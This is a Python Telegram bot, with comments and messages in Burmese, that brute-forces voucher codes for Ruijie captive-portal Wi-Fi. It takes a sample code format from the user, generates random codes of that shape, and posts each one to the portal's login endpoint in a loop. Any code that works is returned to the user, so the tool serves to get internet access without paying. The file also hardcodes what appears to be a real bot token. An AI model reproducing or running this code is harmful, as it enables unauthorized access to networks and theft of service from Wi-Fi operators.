import asyncio
import random
import string
import requests
import netifaces
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# --- CONFIGURATION ---
BOT_TOKEN = "9252854683:AAEHi3fTz5YvObtmdjxpXYEKtujosD7upio"  # BotFather ထံမှ ရရှိသော Token ထည့်ပါ
REQUIRED_KEY = "key :𝐧𝐭𝐡𝐟𝐫𝐞𝐞𝐧𝐞𝐭 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥"
CHANNEL_URL = "https://t.me/nthfreenet_official"

# Ruijie Gateway IP (လိုအပ်ပါက မိမိ Ruijie Router IP အတိုင်း ပြောင်းလဲနိုင်သည်)
RUIJIE_AUTH_URL = "http://10.44.0.1:8080/eportal/InterFace.do?method=login"

# Conversation States
WAITING_FOR_WIFI, WAITING_FOR_KEY, WAITING_FOR_SAMPLE = range(3)

# Global dictionary to track active scanning processes per user
scanning_tasks = {}

# --- HELPER FUNCTIONS ---
def is_wifi_connected():
    """Android/Linux/Windows ပေါ်တွင် Wi-Fi Interface ရှိမရှိ စစ်ဆေးခြင်း"""
    try:
        interfaces = netifaces.interfaces()
        # wlan0, wlan1 သို့မဟုတ် wifi interface ပါဝင်မှု ရှိ/မရှိ စစ်သည်
        for iface in interfaces:
            if "wlan" in iface.lower() or "wifi" in iface.lower():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    return True
        return False
    except Exception:
        # Interface စစ်မရပါက Default အဖြစ် True ပေးထားနိုင်သည် သို့မဟုတ် Network Test လုပ်နိုင်သည်
        return True

def generate_code_from_sample(sample_code: str) -> str:
    """Sample Code ၏ ပုံစံအတိုင်း စာလုံး/ဂဏန်းများ အစားထိုး၍ Code သစ် ထုတ်ပေးခြင်း"""
    result = []
    for char in sample_code:
        if char.isdigit():
            result.append(random.choice(string.digits))
        elif char.isalpha():
            if char.isupper():
                result.append(random.choice(string.ascii_uppercase))
            else:
                result.append(random.choice(string.ascii_lowercase))
        else:
            result.append(char)
    return "".join(result)

def check_ruijie_voucher(voucher_code: str) -> bool:
    """Ruijie Captive Portal သို့ Voucher Code မှန်မမှန် Request ပို့ စစ်ဆေးခြင်း"""
    try:
        payload = {
            "userId": voucher_code,
            "queryString": "",
            "password": "",
            "service": ""
        }
        headers = {"User-Agent": "Mozilla/5.0"}
        # Timeout ကို 2 စက္ကန့်ထား၍ အမြန်စစ်ဆေးသည်
        response = requests.post(RUIJIE_AUTH_URL, data=payload, headers=headers, timeout=2)
        
        # Ruijie Response ပေါ်မူတည်၍ Success ဖြစ်မဖြစ် စစ်ဆေးခြင်း
        if "success" in response.text.lower() or '"result":"1"' in response.text:
            return True
        return False
    except Exception:
        return False

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/start Command ပေးချိန် စတင် နှုတ်ဆက်ခြင်း"""
    welcome_text = (
        "⚡️ @𝐧𝐭𝐡𝐟𝐫𝐞𝐞𝐧𝐞𝐭 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥 မှ ကြိုဆိုပါတယ်!\n\n"
        "နည်းပညာနဲ့ အင်တာနက်ပိုင်းဆိုင်ရာ ဗဟုသုတတွေ၊ အသုံးဝင်မယ့် နည်းလမ်းတွေကို "
        "တစ်နေရာတည်းမှာ လေ့လာနိုင်ဖို့ ဒီ Bot လေးကို ဖန်တီးထားတာဖြစ်ပါတယ်။\n\n"
        "အစဉ်အမြဲ သတင်းအချက်အလက်သစ်တွေ သိရှိနိုင်ဖို့ Channel လေးကို Join ထားကြပါဦးနော်။ ✨"
    )
    
    keyboard = [
        [InlineKeyboardButton("📢 Join Telegram Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("➡️ ကျော်မည် (Next)", callback_data="skip_channel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup)
    return WAITING_FOR_WIFI

async def channel_skipped(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Channel Join ကျော်ပြီးနောက် Home Page နှင့် Wi-Fi စစ်ဆေးခြင်း"""
    query = update.callback_query
    await query.answer()
    
    home_text = (
        "🏠 **RUIJIE VOUCHER CHECKING SYSTEM**\n\n"
        "ပထမအဆင့်အနေနဲ့ Wi-Fi ကို ရှာပြီး ချိတ်ဆက်ပေးပါ။"
    )
    
    keyboard = [[InlineKeyboardButton("🔄 Wi-Fi ချိတ်ဆက်မှု စစ်ဆေးမည်", callback_data="check_wifi")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(home_text, parse_mode="Markdown", reply_markup=reply_markup)
    return WAITING_FOR_WIFI

async def check_wifi_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wi-Fi ချိတ်ထားခြင်း ရှိမရှိ စစ်ဆေးသည့် ခလုတ်နှိပ်သည့်အခါ"""
    query = update.callback_query
    await query.answer()
    
    if is_wifi_connected():
        await query.edit_message_text(
            "✅ Wi-Fi ချိတ်ဆက်မှု အောင်မြင်ပါတယ်။\n\n"
            "ဆက်လက်လုပ်ဆောင်ရန် **Secret Key** ကို ရိုက်ထည့်ပေးပါ။\n"
            "(ဥပမာ - `key :𝐧𝐭𝐡𝐟𝐫𝐞𝐞𝐧𝐞𝐭 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥`)"
        )
        return WAITING_FOR_KEY
    else:
        keyboard = [[InlineKeyboardButton("🔄 ထပ်မံ စစ်ဆေးမည်", callback_data="check_wifi")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "❌ **Wi-Fi မချိတ်ဆက်ရသေးပါ!**\n\n"
            "ကျေးဇူးပြု၍ Ruijie Wi-Fi Network ကို အရင် ချိတ်ဆက်ပေးပါ။ Wi-Fi ချိတ်မှသာ ဆက်သွားနိုင်ပါမည်။",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return WAITING_FOR_WIFI

async def handle_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Secret Key စစ်ဆေးခြင်း"""
    user_text = update.message.text.strip()
    
    if user_text == REQUIRED_KEY:
        await update.message.reply_text(
            "🔑 Key မှန်ကန်ပါသည်။\n\n"
            "စစ်ဆေးလိုသည့် **Voucher Code နမူနာ (Format)** ကို ပေးပို့ပေးပါ:\n"
            "(ဥပမာ - `8888-AAAA-1234` သို့မဟုတ် `NTH12345`)"
        )
        return WAITING_FOR_SAMPLE
    else:
        await update.message.reply_text(
            "❌ Key မမှန်ပါ။ ကျေးဇူးပြု၍ Key ကို မှန်ကန်စွာ ထပ်မံရိုက်ထည့်ပါ။\n"
            f"Key: `{REQUIRED_KEY}`",
            parse_mode="Markdown"
        )
        return WAITING_FOR_KEY

async def start_checking_vouchers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Code များ စတင် စစ်ဆေးပေးခြင်း"""
    user_id = update.message.from_user.id
    sample_code = update.message.text.strip()
    
    keyboard = [[InlineKeyboardButton("🛑 ရပ်မည် (Stop)", callback_data=f"stop_scan_{user_id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    status_msg = await update.message.reply_text(
        f"🔍 **Voucher Codes များ စတင် စစ်ဆေးနေပါပြီ...**\n"
        f"Format: `{sample_code}`\n\n"
        f"စစ်ဆေးပြီးသမျှ Working Codes များကို တိုက်ရိုက် ပြသပေးသွားပါမည်။",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    
    # Track task
    scanning_tasks[user_id] = {
        "running": True,
        "working_codes": []
    }
    
    # Background checking loop
    tested_count = 0
    while scanning_tasks[user_id]["running"]:
        test_code = generate_code_from_sample(sample_code)
        tested_count += 1
        
        # Test code via HTTP Request
        is_valid = check_ruijie_voucher(test_code)
        
        if is_valid:
            scanning_tasks[user_id]["working_codes"].append(test_code)
            await update.message.reply_text(f"🎉 **WORKING CODE FOUND!** : `{test_code}`", parse_mode="Markdown")
            
        # Update progress occasionally
        if tested_count % 5 == 0 and scanning_tasks[user_id]["running"]:
            try:
                await status_msg.edit_text(
                    f"🔍 **Voucher Codes များ စစ်ဆေးနေဆဲ...**\n"
                    f"စစ်ဆေးပြီးသမျှ: {tested_count}\n"
                    f"တွေ့ရှိထားသော Working Codes: {len(scanning_tasks[user_id]['working_codes'])} ခု",
                    reply_markup=reply_markup
                )
            except Exception:
                pass
                
        await asyncio.sleep(0.5)  # Pause briefly per iteration
        
    return ConversationHandler.END

async def stop_scanning(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop ခလုတ် နှိပ်လိုက်ပါက စစ်ဆေးမှုကို ရပ်ဆိုင်းပြီး ရရှိထားသော Codes များ ပြသခြင်း"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if user_id in scanning_tasks:
        scanning_tasks[user_id]["running"] = False
        working_codes = scanning_tasks[user_id]["working_codes"]
        
        result_text = "🛑 **စစ်ဆေးခြင်းကို ရပ်လိုက်ပါပြီ။**\n\n"
        if working_codes:
            result_text += "✨ **အလုပ်လုပ်သော (Working) Voucher Codes များ:**\n"
            for code in working_codes:
                result_text += f"• `{code}`\n"
        else:
            result_text += "⚠️ အလုပ်လုပ်သော Voucher Code များကို ရှာမတွေ့ပါ။"
            
        await query.edit_message_text(result_text, parse_mode="Markdown")
        del scanning_tasks[user_id]

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/cancel command"""
    await update.message.reply_text("လုပ်ဆောင်ချက်ကို ပယ်ဖျက်လိုက်ပါပြီ။")
    return ConversationHandler.END

# --- MAIN FUNCTION ---
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FOR_WIFI: [
                CallbackQueryHandler(channel_skipped, pattern="^skip_channel$"),
                CallbackQueryHandler(check_wifi_status, pattern="^check_wifi$")
            ],
            WAITING_FOR_KEY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key_input)
            ],
            WAITING_FOR_SAMPLE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, start_checking_vouchers)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(stop_scanning, pattern="^stop_scan_"))
    
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
